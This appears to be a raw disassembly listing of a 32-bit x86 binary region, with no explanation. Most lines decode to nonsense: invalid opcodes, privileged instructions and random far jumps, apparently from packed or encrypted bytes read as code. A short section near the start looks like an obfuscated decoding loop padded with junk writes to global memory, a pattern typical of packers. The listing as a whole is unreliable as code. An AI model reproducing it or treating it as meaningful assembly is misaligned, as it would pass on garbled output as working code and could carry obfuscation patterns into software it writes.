  41408f:	mov    gs,WORD PTR [esi+0x30]
  414092:	out    0x3f,al
  414094:	and    BYTE PTR [edx],ah
  414096:	pop    DWORD PTR [eax+0x42f3a1be]
  41409c:	add    ebp,ebp
  41409e:	xchg   esi,eax
  41409f:	jg     0x4140ca
  4140a1:	pop    edx
  4140a2:	sub    eax,0x7ab2663d
  4140a7:	(bad)  
  4140a9:	sub    al,0x98
  4140ab:	cmc    
  4140ac:	adc    edi,DWORD PTR [edi-0x59]
  4140af:	mov    ch,0x78
  4140b1:	enter  0x3d83,0xcb
  4140b5:	fdivr  QWORD PTR [edx]
  4140b7:	and    ecx,0xdf7b0f30
  4140bd:	mov    dl,0x9c
  4140bf:	(bad)  
  4140c0:	jmp    0x414107
  4140c2:	cmp    DWORD PTR [edx+0x7f],0x25ff1ab0
  4140c9:	mov    cl,ah
  4140cb:	inc    edx
  4140cc:	pusha  
  4140cd:	jmp    0x414140
  4140cf:	push   ss
  4140d0:	das    
  4140d1:	pop    ss
  4140d2:	adc    DWORD PTR [esi-0x48],0xffffffaf
  4140d6:	or     BYTE PTR [ecx+0x7],dl
  4140d9:	and    DWORD PTR ds:0x428e2b,ebx
  4140df:	xor    ecx,eax
  4140e1:	mov    esi,0x3272f6
  4140e6:	adc    DWORD PTR ds:0x428e4b,0x428e8b
  4140f0:	push   edi
  4140f1:	add    ecx,esi
  4140f3:	jmp    0x414117
  4140f8:	mov    DWORD PTR ds:0x428e8b,0x6fd6
  414102:	mov    dl,BYTE PTR [ebp-0x1]
  414105:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  41410c:	mov    DWORD PTR ds:0x428e83,0x304c
  414116:	inc    ecx
  414117:	cmp    ecx,0x40
  41411a:	jb     0x4140f8
  414120:	mov    edx,DWORD PTR [ebp-0x18]
  414123:	and    DWORD PTR ds:0x428e93,0x604b
  41412d:	xor    edx,eax
  41412f:	add    edx,esi
  414131:	mov    DWORD PTR ds:0x428e57,0x4fc2
  41413b:	jmp    0x416578
  414140:	and    ecx,edi
  414142:	mov    edi,DWORD PTR [ebp+0x8]
  414145:	neg    ecx
  414147:	mov    ecx,0x8a9b
  41414c:	and    DWORD PTR ds:0x428ecf,0x428ec3
  414156:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41415b:	mov    DWORD PTR ds:0x428eaf,0x4944
  414165:	mov    edi,0x3b5d
  41416a:	and    DWORD PTR ds:0x428ea7,0x428e4b
  414174:	add    cx,di
  414177:	movzx  ecx,cx
  41417a:	xor    DWORD PTR ds:0x428e67,0x5c37
  414184:	mov    DWORD PTR [ebp-0xc],ecx
  414187:	mov    ecx,DWORD PTR [ebp+0x8]
  41418a:	jmp    0x416543
  41418f:	lea    edi,[esp+ebp*8]
  414192:	sub    ecx,esp
  414194:	stos   DWORD PTR es:[edi],eax
  414195:	test   BYTE PTR [edx+ecx*1+0x96a3859],dl
  41419c:	cmp    BYTE PTR [ebp-0x41],0x95
  4141a0:	push   0x60e78382
  4141a5:	add    DWORD PTR [ebx+0x12d00560],0xfffffffe
  4141ac:	xchg   ecx,eax
  4141ad:	mov    esp,DWORD PTR [esi+eiz*8-0x73cb959f]
  4141b4:	(bad)  
  4141b5:	cmp    al,0x4a
  4141b7:	mov    al,0xbf
  4141b9:	xchg   esi,eax
  4141ba:	ja     0x414230
  4141bc:	ja     0x41420c
  4141be:	xchg   BYTE PTR [edx-0x2f60234a],ch
  4141c4:	mov    ?,WORD PTR ds:0x8ec49a3b
  4141ca:	dec    ecx
  4141cb:	push   cs
  4141cc:	in     eax,dx
  4141cd:	cmp    ah,al
  4141cf:	call   0x7beb71f
  4141d4:	adc    al,0xdb
  4141d6:	pop    eax
  4141d7:	je     0x41418e
  4141d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141da:	jno    0x41424c
  4141dc:	les    eax,FWORD PTR [esi+0x58]
  4141df:	or     bh,al
  4141e1:	lods   al,BYTE PTR ds:[esi]
  4141e2:	add    BYTE PTR [esi+0x5f05445b],ch
  4141e8:	fcmovnu st,st(3)
  4141ea:	jb     0x4141ff
  4141ec:	inc    edi
  4141ed:	mov    eax,ds:0x7d6595b8
  4141f2:	inc    esp
  4141f3:	xchg   esi,eax
  4141f4:	out    dx,al
  4141f5:	scas   eax,DWORD PTR es:[edi]
  4141f6:	into   
  4141f7:	add    ebx,DWORD PTR [ecx-0x69]
  4141fa:	clc    
  4141fb:	or     eax,0xe83a3eee
  414200:	jnp    0x4141cd
  414202:	sar    BYTE PTR [ecx-0x5c07758e],1
  414208:	pop    edi
  414209:	inc    esi
  41420a:	dec    esp
  41420b:	or     DWORD PTR [eax-0x3b],edx
  41420e:	addr16 jne 0x414235
  414211:	retf   
  414212:	inc    ecx
  414213:	push   0x67
  414215:	mov    eax,ds:0x79b8d48b
  41421a:	pop    ebx
  41421b:	cs out 0xde,al
  41421e:	pop    ds
  41421f:	scas   eax,DWORD PTR es:[edi]
  414220:	cmc    
  414221:	xor    eax,0xb66488db
  414226:	fs (bad) 
  414228:	int3   
  414229:	hlt    
  41422a:	sar    DWORD PTR gs:[eax],1
  41422d:	shl    DWORD PTR [ebx+0x1a890d57],cl
  414233:	je     0x414200
  414235:	inc    esp
  414236:	pusha  
  414237:	xchg   esi,eax
  414238:	and    al,dl
  41423a:	jmp    0x4142b8
  41423c:	(bad)  
  41423d:	pop    esi
  41423e:	jno    0x41421f
  414240:	fist   DWORD PTR [edx+0x4]
  414243:	sbb    al,0x72
  414245:	adc    al,0xbf
  414247:	call   0x939:0x6601c218
  41424e:	xchg   ebp,eax
  41424f:	mov    ds:0xb44ee6e6,eax
  414254:	cmp    DWORD PTR [ebp+0x5f],ebp
  414257:	sti    
  414258:	int    0x25
  41425a:	xor    al,0x89
  41425c:	push   es
  41425d:	pop    esp
  41425e:	popa   
  41425f:	leave  
  414260:	jbe    0x4142a7
  414262:	retf   
  414263:	call   0x677490b9
  414268:	out    0x22,eax
  41426a:	push   0xffffffe6
  41426c:	adc    edi,ebp
  41426e:	sub    edi,DWORD PTR ds:0x8fc2b864
  414274:	call   0x11f:0x1df2443f
  41427b:	add    BYTE PTR [eax-0x6f],ah
  41427e:	mov    WORD PTR [ecx-0x12a7a75f],ss
  414284:	das    
  414285:	pop    edx
  414286:	push   0x99e228ac
  41428b:	and    DWORD PTR [edi],0x5e
  41428e:	cmp    eax,0x5e0d1fd
  414293:	inc    ebx
  414294:	sbb    cl,BYTE PTR [ebp+eax*4-0x6ff65a48]
  41429b:	mov    BYTE PTR cs:[ebp+eiz*8-0x3277b764],cl
  4142a3:	not    BYTE PTR [eax+0x709b531b]
  4142a9:	mov    ds:0xad526ab7,eax
  4142ae:	(bad)  
  4142b2:	cld    
  4142b3:	xor    BYTE PTR [ebx-0x6],cl
  4142b6:	pop    edi
  4142b7:	push   ecx
  4142b8:	push   esp
  4142b9:	mov    ebx,0x10604f35
  4142be:	dec    edi
  4142bf:	cmp    al,0x9b
  4142c1:	or     esi,ebp
  4142c3:	pop    ss
  4142c4:	popa   
  4142c5:	iret   
  4142c6:	jle    0x4142a4
  4142c8:	sbb    al,0xc2
  4142cb:	xor    BYTE PTR [eax],0x1c
  4142ce:	in     al,0xa
  4142d0:	xchg   esp,eax
  4142d1:	mov    cl,0x2f
  4142d3:	inc    esp
  4142d4:	test   BYTE PTR [esi+0x7c],dh
  4142d7:	pop    esp
  4142d8:	add    ecx,esi
  4142da:	pop    esp
  4142db:	repnz mov esi,0xa9109c73
  4142e1:	jge    0x414318
  4142e3:	retf   
  4142e4:	sbb    eax,0xe0d57c6c
  4142e9:	cmp    cl,cl
  4142eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142ed:	xchg   edi,eax
  4142ee:	and    BYTE PTR [ebx-0xd],0xf7
  4142f2:	aam    0xb3
  4142f4:	fisubr WORD PTR [edx-0x4e0afb4a]
  4142fa:	mov    ah,ah
  4142fc:	ss loop 0x4142cc
  4142ff:	jbe    0x4142f9
  414301:	adc    ebp,edi
  414303:	mov    WORD PTR [edx+0x5f],ds
  414306:	jecxz  0x41432d
  414308:	lds    edi,FWORD PTR [edi]
  41430a:	xor    DWORD PTR [edi+0x15],edx
  41430d:	mov    ch,0xd4
  41430f:	xchg   edi,eax
  414310:	push   es
  414311:	pop    ecx
  414312:	and    eax,0xe7cb577d
  414317:	fmul   DWORD PTR [esi+0x647e4ed1]
  41431d:	add    dl,cl
  41431f:	and    eax,0x85e22caf
  414324:	test   BYTE PTR [ebx+0x5f],bl
  414327:	dec    ebx
  414328:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414329:	retf   0x1ccf
  41432c:	sub    al,0x7a
  41432e:	mov    bl,0x43
  414330:	jb     0x414344
  414332:	sub    BYTE PTR [eax-0x5878faee],0xd0
  414339:	dec    edi
  41433a:	es push 0xfe701468
  414340:	and    BYTE PTR [eax+0x59],al
  414343:	mov    ecx,esp
  414345:	jp     0x4142cd
  414347:	imul   eax,DWORD PTR [edi-0x1767dcca],0x1b
  41434e:	fistp  QWORD PTR [eax]
  414350:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414351:	mov    dl,0x5b
  414353:	cmc    
  414354:	scas   al,BYTE PTR es:[edi]
  414355:	daa    
  414356:	push   ss
  414357:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414358:	mov    esi,0xa0ed0602
  41435d:	rol    BYTE PTR es:0x485b7a33,0xd5
  414365:	and    DWORD PTR [edi+0x5f],ebx
  414368:	cli    
  414369:	jmp    0x4143ac
  41436b:	or     eax,0x3fabb142
  414370:	(bad)  
  414371:	les    eax,FWORD PTR [edx]
  414373:	clc    
  414374:	mov    ?,ecx
  414376:	push   edx
  414377:	mov    esi,0xe2b8f51a
  41437c:	or     al,0x74
  41437e:	add    al,0x48
  414380:	and    cl,BYTE PTR [edx+0x6101eac3]
  414386:	retf   0xc241
  414389:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41438a:	arpl   WORD PTR ss:[ebp-0x44],si
  41438e:	xlat   BYTE PTR ds:[ebx]
  41438f:	mov    DWORD PTR [eax-0x3],edi
  414392:	je     0x414395
  414394:	stos   BYTE PTR es:[edi],al
  414395:	push   ebp
  414396:	bound  eax,QWORD PTR [edx]
  414398:	jp     0x414401
  41439a:	(bad)  
  41439b:	xchg   esi,eax
  41439c:	mov    eax,0x5dac91d
  4143a1:	and    ecx,eax
  4143a3:	popa   
  4143a4:	xor    DWORD PTR [ebp-0x12],edx
  4143a7:	mov    al,ds:0x30d3d6a8
  4143ac:	int    0x71
  4143ae:	fsubr  DWORD PTR [edi+0x3f1c4a1f]
  4143b4:	das    
  4143b5:	sbb    dl,al
  4143b7:	ret    0x52cd
  4143ba:	jmp    0xf3fc:0xd236a1a1
  4143c1:	stos   BYTE PTR es:[edi],al
  4143c2:	neg    BYTE PTR [ecx+ebp*1+0x20]
  4143c6:	or     eax,0xea345194
  4143cb:	out    0x64,al
  4143cd:	mov    bl,0x56
  4143cf:	sti    
  4143d0:	or     eax,DWORD PTR ds:0x28cba097
  4143d6:	addr16 ret 0xf177
  4143da:	sub    BYTE PTR [edx-0x1d],ah
  4143dd:	fild   DWORD PTR [esi+0x6e1365ac]
  4143e3:	pop    esp
  4143e4:	test   al,0x6
  4143e6:	mov    al,ds:0xc8197371
  4143eb:	inc    ebp
  4143ec:	fist   DWORD PTR [ebx-0x17]
  4143ef:	or     al,0x4d
  4143f1:	ja     0x4143b4
  4143f3:	or     eax,0x4a643b3b
  4143f8:	outs   dx,DWORD PTR ds:[esi]
  4143f9:	ins    DWORD PTR es:[edi],dx
  4143fa:	cs mov ebx,0x32d6d6cb
  414400:	popa   
  414401:	(bad)  
  414402:	fstp   TBYTE PTR [edx]
  414404:	push   esp
  414405:	push   ss
  414406:	(bad)  
  414407:	(bad)  
  414408:	in     al,0xed
  41440a:	sub    cl,BYTE PTR [edx]
  41440c:	lods   eax,DWORD PTR ds:[esi]
  41440d:	repz jmp 0xdab:0x2a9e8677
  414415:	inc    eax
  414416:	shl    DWORD PTR [esi],0xe4
  414419:	mov    DWORD PTR [edx+0x2e],edi
  41441c:	(bad)  
  41441d:	mov    dh,0x8d
  41441f:	adc    BYTE PTR [esi],cl
  414421:	xchg   ecx,eax
  414422:	fimul  DWORD PTR [edx+ebx*4-0x659b217d]
  414429:	test   BYTE PTR [edi-0x1ac35c27],bh
  41442f:	add    ecx,esp
  414431:	jno    0x4144ad
  414433:	push   edx
  414434:	leave  
  414435:	ss scas al,BYTE PTR es:[edi]
  414437:	mov    esi,0x8735c181
  41443c:	sub    al,0x79
  41443e:	bound  esi,QWORD PTR [esi+0x73]
  414441:	popa   
  414442:	adc    BYTE PTR [ebx],ch
  414444:	bound  esp,QWORD PTR [ebx]
  414446:	loope  0x41444d
  414448:	xchg   ebp,eax
  414449:	add    eax,0xf9b9d13f
  41444e:	stos   BYTE PTR es:[edi],al
  41444f:	imul   DWORD PTR [edx-0x3a]
  414452:	imul   esp,edx,0x5b
  414455:	jp     0x414479
  414457:	add    eax,ebx
  414459:	and    al,0x77
  41445b:	jg     0x414468
  41445d:	loop   0x414489
  41445f:	neg    DWORD PTR [esi-0x4f3be46b]
  414465:	xchg   edi,eax
  414466:	xchg   BYTE PTR [ebx-0x22],dl
  414469:	addr16 push es
  41446b:	mov    dh,0xa
  41446d:	mov    eax,ds:0x775002d7
  414472:	push   edx
  414473:	mov    ah,BYTE PTR [edx-0x1]
  414476:	xchg   ebp,edi
  414478:	(bad)  
  414479:	adc    DWORD PTR [edi+0x7528374d],eax
  41447f:	xchg   edx,eax
  414480:	cwde   
  414481:	inc    BYTE PTR [eax-0xe2ba039]
  414487:	xchg   ecx,eax
  414488:	adc    ch,BYTE PTR [esi-0x2d]
  41448b:	and    ch,ch
  41448d:	sbb    DWORD PTR [ebx+0x6fde482b],eax
  414493:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414494:	dec    esp
  414495:	arpl   ax,cx
  414497:	mov    ebp,0x5cf707c0
  41449c:	in     eax,dx
  41449d:	popw   es
  41449f:	pop    ecx
  4144a0:	(bad)  
  4144a1:	mov    ds:0xa2767bd6,eax
  4144a6:	aad    0xd4
  4144a8:	jne    0x41444a
  4144aa:	in     eax,dx
  4144ab:	mov    ds:0x55085973,al
  4144b0:	xchg   esp,eax
  4144b1:	leave  
  4144b2:	xchg   BYTE PTR [esi-0x1f],ah
  4144b5:	add    al,0xc3
  4144b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144b8:	aam    0x91
  4144ba:	push   esp
  4144bb:	fdiv   DWORD PTR [eax-0x8b7a39b]
  4144c1:	sbb    eax,0xdc6c2bc6
  4144c6:	sti    
  4144c7:	hlt    
  4144c8:	or     BYTE PTR gs:[esi+edi*8],bh
  4144cc:	xor    eax,0x1eed401
  4144d2:	push   ss
  4144d3:	adc    ch,bl
  4144d5:	sbb    al,0x7b
  4144d7:	add    BYTE PTR [ecx-0x3a],dh
  4144da:	cmp    eax,0x9bc7254e
  4144df:	mov    si,0x7198
  4144e3:	dec    edx
  4144e4:	and    esi,0xffffff9f
  4144e7:	ds cld 
  4144e9:	test   DWORD PTR [esi+0x5a442f52],0x7e4d211f
  4144f3:	xchg   DWORD PTR [edi-0x13],ecx
  4144f6:	mov    eax,0x8a60e7ee
  4144fb:	(bad)  
  4144fc:	pop    ebp
  4144fd:	(bad)  
  4144fe:	sbb    edi,DWORD PTR [edi]
  414500:	xchg   ebp,eax
  414501:	pop    edx
  414502:	jecxz  0x414524
  414504:	adc    ah,al
  414506:	adc    al,0x2a
  414508:	mov    esi,0x528e906f
  41450d:	addr16 aaa 
  41450f:	ror    BYTE PTR [eax+0x28],1
  414512:	shl    DWORD PTR [ecx],1
  414514:	sbb    ch,bl
  414516:	adc    ebp,ecx
  414518:	pop    edx
  414519:	jmp    0x41451c
  41451b:	push   edi
  41451c:	and    BYTE PTR [ebp+0x3f59582a],al
  414522:	jno    0x4144f4
  414524:	inc    ebp
  414525:	stos   BYTE PTR es:[edi],al
  414526:	mul    ecx
  414528:	mov    eax,0x5799a9ec
  41452d:	dec    ebp
  41452e:	xor    bl,BYTE PTR [esi]
  414530:	push   ebx
  414531:	jbe    0x414555
  414533:	xlat   BYTE PTR ds:[bx]
  414535:	in     al,dx
  414536:	(bad)  
  414538:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414539:	leave  
  41453a:	mov    ds:0x36c8e888,al
  41453f:	outs   dx,DWORD PTR ds:[esi]
  414540:	pop    esi
  414541:	pop    es
  414542:	ret    0x4564
  414545:	stc    
  414546:	(bad)  
  414547:	cmp    DWORD PTR [esi],edx
  414549:	addr16 repz (bad) 
  41454c:	bound  esi,QWORD PTR [esi]
  41454e:	jmp    0x3f4deeb2
  414553:	jo     0x41456b
  414555:	xor    BYTE PTR [edi+ebp*4+0x46],dl
  414559:	or     BYTE PTR [eax+eiz*8+0x1],ah
  41455d:	call   FWORD PTR [edx-0x2a]
  414560:	js     0x4145b8
  414562:	fidivr WORD PTR [edi]
  414564:	int3   
  414565:	pop    ss
  414566:	inc    esp
  414567:	(bad)  
  414568:	in     al,0x98
  41456a:	inc    ebp
  41456b:	popf   
  41456c:	jnp    0x4145dd
  41456e:	mov    eax,0x134772b2
  414573:	mov    eax,ds:0x7565efc0
  414578:	loop   0x414582
  41457a:	inc    ebx
  41457b:	pop    ebp
  41457c:	xchg   edx,eax
  41457d:	je     0x414596
  41457f:	out    dx,eax
  414580:	adc    ah,0x9c
  414583:	ins    BYTE PTR es:[edi],dx
  414584:	xor    bl,BYTE PTR [eax-0x66]
  414587:	loopne 0x41453f
  414589:	fidivr DWORD PTR [edx]
  41458b:	cmp    eax,0x2afc36b6
  414590:	stc    
  414591:	(bad)  
  414592:	loope  0x4145c6
  414594:	mov    ebx,0xbd609f08
  414599:	je     0x4145e6
  41459b:	add    DWORD PTR [eax],esi
  41459d:	stc    
  41459e:	ret    0x23f8
  4145a1:	lods   al,BYTE PTR ds:[esi]
  4145a2:	inc    esp
  4145a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145a4:	jmp    0x414608
  4145a6:	mov    bh,0xe7
  4145a8:	sub    eax,0x4568cbff
  4145ad:	push   ebp
  4145ae:	push   0x20
  4145b0:	loop   0x4145e9
  4145b2:	popf   
  4145b3:	dec    eax
  4145b4:	sar    BYTE PTR ds:0x4a635978,0x6b
  4145bb:	xchg   BYTE PTR [edx],ah
  4145bd:	pop    ss
  4145be:	mov    esi,0xb7963f4e
  4145c3:	sbb    BYTE PTR [edi-0x765dfe1b],cl
  4145c9:	mov    eax,0xa9668986
  4145ce:	xchg   ebx,eax
  4145cf:	sub    esi,DWORD PTR [eax+0x5dae01b2]
  4145d5:	lock sahf 
  4145d7:	in     eax,dx
  4145d8:	adc    al,0x6f
  4145da:	leave  
  4145db:	and    esi,ecx
  4145dd:	inc    ebp
  4145de:	push   cs
  4145df:	cmp    al,0xdf
  4145e1:	mov    ebp,0x225141e6
  4145e6:	or     al,0x89
  4145e8:	clc    
  4145e9:	lds    esp,FWORD PTR [esi-0x36]
  4145ec:	cmp    eax,0x160e7b17
  4145f1:	xor    dh,bh
  4145f3:	mov    WORD PTR [esi+0x31016fe7],fs
  4145f9:	mov    ecx,0xca646a03
  4145fe:	in     al,dx
  4145ff:	add    edx,DWORD PTR [ebx]
  414601:	add    edx,DWORD PTR [edi-0x40]
  414604:	(bad)  
  414605:	push   DWORD PTR [eax]
  414607:	sar    DWORD PTR [eax+0x55],cl
  41460a:	push   esi
  41460b:	lods   al,BYTE PTR ds:[esi]
  41460c:	mov    edx,0xdae6896a
  414611:	xchg   ebx,esi
  414613:	cmovl  ebp,DWORD PTR [edi]
  414616:	or     esi,esi
  414618:	retf   0x906d
  41461b:	ret    
  41461c:	jecxz  0x41460d
  41461e:	fwait
  41461f:	xchg   ebx,eax
  414620:	aaa    
  414621:	jecxz  0x41462d
  414623:	arpl   WORD PTR [edi-0x5f898f8c],bx
  414629:	mov    ebp,0x373cb05b
  41462e:	and    edx,DWORD PTR [ecx]
  414630:	icebp  
  414631:	aaa    
  414632:	ret    
  414633:	aam    0xd6
  414635:	and    ebp,eax
  414637:	imul   ecx,ebp,0xffffffbb
  41463a:	cld    
  41463b:	mov    ?,WORD PTR [ecx+esi*4+0x72499572]
  414642:	pop    es
  414643:	std    
  414644:	rcl    DWORD PTR [eax],0x97
  414647:	rcr    edx,1
  414649:	in     al,0xbd
  41464b:	pop    es
  41464c:	loopne 0x41464f
  41464e:	xchg   DWORD PTR [ebp-0x63e814c7],ebx
  414654:	xor    ebx,DWORD PTR [edi+0x11]
  414657:	and    ecx,edx
  414659:	repz or ecx,DWORD PTR [edi+ebp*4+0x68]
  41465e:	sar    DWORD PTR [esi+0x27],1
  414661:	cmc    
  414662:	xchg   BYTE PTR fs:[ebp-0x78179186],bl
  414669:	lods   al,BYTE PTR ds:[esi]
  41466a:	jnp    0x4146e0
  41466c:	je     0x41464c
  41466e:	repz int3 
  414670:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414671:	and    cl,0x46
  414674:	cdq    
  414675:	push   esp
  414676:	and    al,BYTE PTR [ebx]
  414678:	test   BYTE PTR [eax-0x6baf8f05],dh
  41467e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41467f:	stc    
  414680:	xlat   BYTE PTR ds:[ebx]
  414681:	dec    eax
  414682:	or     ch,ah
  414684:	push   esp
  414685:	mov    cl,0x37
  414687:	xchg   ebp,eax
  414688:	push   cs
  414689:	popa   
  41468a:	jns    0x414696
  41468c:	and    DWORD PTR [edi],edx
  41468e:	jp     0x41461c
  414690:	mov    ah,0xea
  414692:	xchg   ecx,eax
  414693:	mov    al,BYTE PTR [esp+ebp*2+0x55aaaaf9]
  41469a:	popa   
  41469b:	xchg   edx,eax
  41469c:	or     dl,bl
  41469e:	in     al,dx
  41469f:	jae    0x41466c
  4146a1:	xchg   ebx,eax
  4146a2:	inc    edi
  4146a3:	push   es
  4146a4:	xor    DWORD PTR [ebp+0x241dcf37],ebp
  4146aa:	shr    BYTE PTR [edi-0x5],cl
  4146ad:	retf   0x7736
  4146b0:	jge    0x4146d6
  4146b2:	add    esi,DWORD PTR [edx]
  4146b4:	push   cs
  4146b5:	mov    dl,0x72
  4146b7:	sahf   
  4146b8:	(bad)  
  4146b9:	mov    bh,0xcd
  4146bb:	arpl   WORD PTR [ecx],di
  4146bd:	inc    eax
  4146be:	cmp    dh,BYTE PTR [edi]
  4146c0:	xchg   edi,eax
  4146c1:	dec    ebx
  4146c2:	sbb    al,0xb8
  4146c4:	or     al,0xe4
  4146c6:	inc    ebp
  4146c7:	mov    WORD PTR [edi-0x63],ds
  4146ca:	push   eax
  4146cb:	or     esi,edx
  4146cd:	pop    ebx
  4146ce:	ret    
  4146cf:	or     DWORD PTR [ebp+0x17f8b01d],0x69
  4146d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146d7:	(bad)  
  4146d8:	xchg   esi,eax
  4146d9:	(bad)  
  4146db:	dec    eax
  4146dc:	out    dx,eax
  4146dd:	sub    ch,ch
  4146df:	push   ds
  4146e0:	pop    es
  4146e1:	cmp    ebx,DWORD PTR [esi*2+0x4c801ce0]
  4146e8:	out    0xf7,al
  4146ea:	xchg   ecx,eax
  4146eb:	out    dx,eax
  4146ec:	mov    ah,0x93
  4146ee:	dec    esp
  4146ef:	adc    eax,0x48a693f3
  4146f4:	mov    BYTE PTR [ecx-0x50e8ca5c],bh
  4146fa:	dec    edx
  4146fb:	mov    esi,0xc1f16d2f
  414700:	push   0xb4e08fcf
  414705:	or     al,0x95
  414707:	(bad)  
  414708:	int3   
  414709:	mov    ds:0x4a462641,al
  41470e:	scas   al,BYTE PTR es:[edi]
  41470f:	fs leave 
  414711:	xchg   edx,eax
  414712:	rcr    ch,0x1b
  414715:	xchg   ecx,eax
  414716:	lahf   
  414717:	push   ecx
  414718:	mov    ds:0xfa1a7d7f,eax
  41471d:	gs and eax,0xc1852d1a
  414723:	imul   edi,DWORD PTR [ecx+0x66ffd82e],0x56
  41472a:	or     esi,eax
  41472c:	popf   
  41472d:	out    0x17,al
  41472f:	xchg   esi,eax
  414730:	jne    0x41478d
  414732:	and    BYTE PTR [ebp+0x60],bl
  414735:	ret    0x3356
  414738:	fldenv [ecx]
  41473a:	mov    ds:0x8dab1742,al
  41473f:	dec    edx
  414740:	adc    cl,dl
  414742:	jmp    0x3daf02b4
  414747:	sahf   
  414748:	jne    0x41475b
  41474a:	lods   eax,DWORD PTR ds:[esi]
  41474b:	cs stos DWORD PTR es:[edi],eax
  41474d:	jg     0x414775
  41474f:	mov    eax,0xe598c603
  414754:	(bad)  
  414755:	ja     0x414765
  414757:	push   esi
  414758:	loop   0x414797
  41475a:	jnp    0x4147bc
  41475c:	fcomip st,st(0)
  41475e:	enter  0xde54,0xf7
  414762:	jl     0x41470a
  414764:	and    dl,BYTE PTR [ebp+0xd]
  414767:	ret    0xa36a
  41476a:	fisub  WORD PTR [esi-0x7d]
  41476d:	out    dx,al
  41476e:	jae    0x4147dd
  414770:	and    BYTE PTR [ebx-0x4a],al
  414773:	cdq    
  414774:	jnp    0x4147e8
  414776:	jmp    0x746c:0x33307b55
  41477d:	jns    0x4147f3
  41477f:	fidiv  DWORD PTR [ebp+0x481a50d8]
  414785:	jne    0x41471b
  414787:	mov    dl,dh
  414789:	add    esp,ebx
  41478b:	aad    0xfb
  41478d:	jno    0x4147c9
  41478f:	rcl    ch,0xc3
  414792:	jge    0x41480c
  414794:	loope  0x4147eb
  414796:	mov    ah,0x2e
  414798:	push   edx
  414799:	fdiv   DWORD PTR [eax+0xff545e9]
  41479f:	mov    ebx,0x21bbcdaa
  4147a4:	adc    DWORD PTR [ecx],eax
  4147a6:	fisub  WORD PTR [esp+ebp*4-0x6]
  4147aa:	and    DWORD PTR [eax-0x7f],0xcd6751dc
  4147b1:	inc    eax
  4147b2:	pop    esp
  4147b3:	gs add eax,0xf984b240
  4147b9:	ja     0x414835
  4147bb:	retf   0x74a0
  4147be:	daa    
  4147bf:	gs stos DWORD PTR es:[edi],eax
  4147c1:	xor    BYTE PTR [eax+0x422cb400],dh
  4147c7:	ror    DWORD PTR [esi+0x52af0c1f],1
  4147cd:	push   eax
  4147ce:	retf   
  4147cf:	fnstenv [ebx-0x331756b7]
  4147d5:	jmp    0xdaf941bb
  4147da:	or     DWORD PTR [ebx+esi*4-0x36],esi
  4147de:	aad    0x43
  4147e0:	add    bl,dh
  4147e2:	scas   eax,DWORD PTR es:[edi]
  4147e3:	outs   dx,BYTE PTR ds:[esi]
  4147e4:	push   ds
  4147e5:	push   es
  4147e6:	or     DWORD PTR [edx-0x7600fd8f],ecx
  4147ec:	int    0x42
  4147ee:	pop    edx
  4147ef:	dec    edi
  4147f0:	dec    edx
  4147f1:	jg     0x4147b3
  4147f3:	bound  ecx,QWORD PTR [esi]
  4147f5:	imul   edx,DWORD PTR [ebp+0x21e699af],0x8b118efe
  4147ff:	inc    esp
  414800:	inc    ebx
  414801:	repz btc DWORD PTR [esi-0x6a527077],0xf7
  41480a:	daa    
  41480b:	xor    dl,ch
  41480d:	mov    DWORD PTR [edi],eax
  41480f:	sbb    ch,al
  414811:	inc    esi
  414812:	popf   
  414813:	daa    
  414814:	or     edi,DWORD PTR [ebx]
  414816:	out    0xa3,al
  414818:	outs   dx,DWORD PTR ds:[esi]
  414819:	imul   ebp,ebp,0x25
  41481c:	mov    ds:0x11afc8c1,eax
  414821:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414822:	jns    0x414876
  414824:	xor    eax,DWORD PTR [ecx+0x6a0b5f47]
  41482a:	and    ah,BYTE PTR [ebx+0x1e]
  41482d:	jmp    0xf5158d26
  414832:	adc    DWORD PTR [ecx],ebx
  414834:	cdq    
  414835:	sub    ah,BYTE PTR [ebp-0x1e]
  414838:	sub    ebp,DWORD PTR [ebx]
  41483a:	push   edx
  41483b:	mov    dl,0xc8
  41483d:	clc    
  41483e:	xor    eax,0x3822ae54
  414843:	xchg   esp,eax
  414844:	xchg   esp,eax
  414845:	or     al,0x23
  414847:	ficom  WORD PTR [edi]
  414849:	(bad)  
  41484a:	inc    BYTE PTR [ecx-0x64518cd4]
  414850:	call   0x751560ff
  414855:	out    dx,al
  414856:	ror    DWORD PTR ds:0x3da96ed7,1
  41485c:	add    edx,DWORD PTR [ebx-0x2b2f6411]
  414862:	sbb    ah,BYTE PTR [edx+0x766d405c]
  414868:	or     eax,0x3b64d625
  41486d:	or     al,0xba
  41486f:	or     dh,BYTE PTR [edx+0x3b]
  414872:	adc    BYTE PTR [edx+esi*8-0x72],ah
  414876:	inc    ebx
  414877:	cmp    BYTE PTR [ecx+0x7fa9f73b],ch
  41487d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41487e:	popa   
  41487f:	mov    edx,0x8fccec9b
  414884:	push   es
  414885:	push   edi
  414886:	es cmp edi,edx
  414889:	cmp    eax,0xd44f33e6
  41488e:	xlat   BYTE PTR ds:[ebx]
  41488f:	mov    edx,0xd1e524ca
  414894:	pop    ebx
  414895:	pop    eax
  414896:	ror    DWORD PTR [eax],1
  414898:	fcom   QWORD PTR [ebp+eax*1-0x26]
  41489c:	(bad)  
  41489e:	mov    bl,BYTE PTR ds:0x3ad2f6fe
  4148a4:	dec    edi
  4148a5:	pop    es
  4148a6:	sar    DWORD PTR [eax-0x7377e53a],0xf8
  4148ad:	fdivr  DWORD PTR [ebp-0x49d33d10]
  4148b3:	cmp    eax,0xc9681fef
